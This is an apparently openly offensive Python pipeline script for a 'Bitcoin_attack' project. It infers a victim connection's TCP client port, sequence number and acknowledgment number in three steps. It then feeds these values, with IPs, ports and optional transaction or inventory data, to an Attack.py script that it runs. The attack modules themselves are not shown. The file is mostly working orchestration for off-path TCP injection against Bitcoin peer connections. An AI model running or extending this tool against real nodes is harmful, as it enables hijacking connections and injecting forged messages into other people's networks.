#!/usr/bin/env python3
from __future__ import annotations

import argparse
import json
import runpy
import sys
from pathlib import Path
from typing import Any, Dict, Tuple

# Step modules (as you named them)
from InferPort import run_step1 as run_infer_port
from InferSeq import run_step2 as run_infer_seq
from InferAck import run_step_ack as run_infer_ack


# -----------------------------
# Utils
# -----------------------------
def load_config(path: str) -> dict:
    p = Path(path)
    if not p.exists():
        raise FileNotFoundError(path)
    if p.suffix.lower() == ".json":
        return json.loads(p.read_text(encoding="utf-8"))
    raise ValueError("Config must be .json for this main.py")


def _require(d: Dict[str, Any], k: str, ctx: str) -> Any:
    if k not in d:
        raise KeyError(f"Missing key '{k}' in {ctx}")
    return d[k]


def _merge_defaults(dst: Dict[str, Any], src: Dict[str, Any], keys: Tuple[str, ...]) -> None:
    for k in keys:
        if k in src and k not in dst:
            dst[k] = src[k]


def _save_json(path: str, obj: Any) -> None:
    Path(path).write_text(json.dumps(obj, indent=2, sort_keys=False), encoding="utf-8")


def run_attack_py(
    attack_cfg: Dict[str, Any],
    seq: int,
    ack: int,
    *,
    dry_run: bool = False,
) -> None:
    """
    Execute Bitcoin_attack/Attack.py as-is (via runpy) with argv mapped from config.
    This avoids modifying Attack.py and still "runs that script".
    """
    script_path = Path(__file__).resolve().parent / "Bitcoin_attack" / "Attack.py"
    if not script_path.exists():
        raise FileNotFoundError(f"Attack.py not found at: {script_path}")

    # Required keys in attack_cfg (match Attack.py argparse flags)
    src_ip = _require(attack_cfg, "src_ip", "step4_attack_py")
    dst_ip = _require(attack_cfg, "dst_ip", "step4_attack_py")
    src_port = int(_require(attack_cfg, "src_port", "step4_attack_py"))
    dst_port = int(_require(attack_cfg, "dst_port", "step4_attack_py"))

    # Optional keys
    iface = attack_cfg.get("iface", None)          # Attack.py uses --iface default None
    inv_type = int(attack_cfg.get("inv_type", 1))
    txid_hex = attack_cfg.get("txid_hex", None)    # Attack.py flag: --txid-hex
    tx_hex = attack_cfg.get("tx_hex", None)        # Attack.py flag: --tx-hex
    timeout = float(attack_cfg.get("timeout", 5.0))

    argv = [
        str(script_path.name),  # argv[0] for argparse help
        "--src-ip",
        str(src_ip),
        "--dst-ip",
        str(dst_ip),
        "--src-port",
        str(src_port),
        "--dst-port",
        str(dst_port),
        "--seq",
        str(int(seq) & 0xFFFFFFFF),
        "--ack",
        str(int(ack) & 0xFFFFFFFF),
        "--inv-type",
        str(inv_type),
        "--timeout",
        str(timeout),
    ]

    if iface is not None:
        argv.extend(["--iface", str(iface)])
    if txid_hex is not None:
        argv.extend(["--txid-hex", str(txid_hex)])
    if tx_hex is not None:
        argv.extend(["--tx-hex", str(tx_hex)])

    if dry_run:
        print("[main] DRY RUN: would execute Attack.py with argv:")
        print("  python3", str(script_path), " ".join(argv[1:]))
        return

    old_argv = sys.argv
    try:
        sys.argv = argv
        runpy.run_path(str(script_path), run_name="__main__")
    finally:
        sys.argv = old_argv


# -----------------------------
# main pipeline
# -----------------------------
def main():
    ap = argparse.ArgumentParser("Bitcoin_attack pipeline main")
    ap.add_argument("--config", required=True, help="Path to config JSON")
    ap.add_argument("--dry-run", action="store_true", help="Print inferred values but do not send packets")
    ap.add_argument("--save", default=None, help="Optional path to save pipeline result JSON")
    args = ap.parse_args()

    cfg = load_config(args.config)

    # Optional: allow top-level "common" to reduce repetition in JSON
    common = cfg.get("common", {})
    for block_name in ("step1_infer_port", "step2_infer_seq", "step3_infer_ack"):
        if block_name in cfg and isinstance(cfg[block_name], dict):
            _merge_defaults(
                cfg[block_name],
                common,
                keys=(
                    "client_ip",
                    "server_ip",
                    "server_port",
                    "send_if_name",
                    "sniff_if_name",
                    "client_mac",
                    "expected_raw_len",
                ),
            )

    # -------------------------
    # Step 1: Infer client port
    # -------------------------
    step1_cfg = _require(cfg, "step1_infer_port", "config")
    r1 = run_infer_port(step1_cfg)
    client_port = r1.get("client_port")
    if client_port is None:
        raise RuntimeError(f"Step1 failed: client_port not found. r1={r1}")
    client_port = int(client_port)
    print(f"[main] Step1 client_port={client_port}")

    # -------------------------
    # Step 2: Infer seq_next
    # -------------------------
    step2_cfg = _require(cfg, "step2_infer_seq", "config")
    step2_cfg = dict(step2_cfg)
    step2_cfg["client_port"] = client_port
    r2 = run_infer_seq(step2_cfg)
    if "seq_next" not in r2:
        raise RuntimeError(f"Step2 failed: missing seq_next. r2={r2}")
    seq_next = int(r2["seq_next"])
    print(f"[main] Step2 seq_next={seq_next}")

    # -------------------------
    # Step 3: Infer ack_value
    # -------------------------
    step3_cfg = _require(cfg, "step3_infer_ack", "config")
    step3_cfg = dict(step3_cfg)
    step3_cfg["client_port"] = client_port
    r3 = run_infer_ack(step3_cfg)
    if "ack_value" not in r3:
        raise RuntimeError(f"Step3 failed: missing ack_value. r3={r3}")
    ack_value = int(r3["ack_value"])
    print(f"[main] Step3 ack_value={ack_value}")

    # -------------------------
    # Step 4: Run Bitcoin_attack/Attack.py
    # -------------------------
    attack_cfg = _require(cfg, "step4_attack_py", "config")

    pipeline_result = {
        "step1": r1,
        "step2": r2,
        "step3": r3,
        "inferred": {
            "client_port": client_port,
            "seq_next": seq_next,
            "ack_value": ack_value,
        },
        "dry_run": bool(args.dry_run),
    }

    if args.save:
        _save_json(args.save, pipeline_result)
        print(f"[main] saved result to {args.save}")

    run_attack_py(attack_cfg, seq=seq_next, ack=ack_value, dry_run=args.dry_run)

    print("[main] done.")


if __name__ == "__main__":
    main()
